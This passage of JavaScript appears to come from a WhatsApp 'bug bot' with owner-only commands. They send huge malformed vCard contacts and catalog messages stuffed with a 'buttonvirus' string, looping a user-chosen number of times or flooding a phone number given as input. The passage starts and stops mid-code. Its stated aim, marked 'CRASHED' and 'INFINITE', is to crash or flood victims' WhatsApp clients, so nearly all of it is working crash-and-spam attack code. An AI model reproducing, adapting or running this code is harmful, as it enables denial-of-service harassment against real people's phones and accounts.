karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
hisoka.sendContact(m.chat, global.owner, fkontaak)
}
}
break
case 'faraxxbug': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Fax Faraxx Modderˣ_ˣ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
hisoka.sendContact(m.chat, global.premium, fkontaak)
}
}
break
case 'catalogbug': {
if (!isCreator) return
if (args.length == 0) return freply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: hisoka.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "99999999999999",
"title": `Faxx! Faraxxx ??ˣ_ˣ CATALOG 🔥➥ ${buttonvirus} ${buttonvirus}`,
"description": `Faxx! Faraxxx ??ˣ_ˣ CATALOG ${buttonvirus} ${buttonvirus}`,
"currencyCode": "IDR",
"footerText": `Faxx! Faraxxx ??ˣ_ˣ CATALOG`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `Faxx! Faraxxx ??`,
"url": "wa.me/6281523940672"
},
"businessOwnerJid": "6281523940672@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ctlg })
hisoka.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
case 'santetto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
        case 'gassantet': {          
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
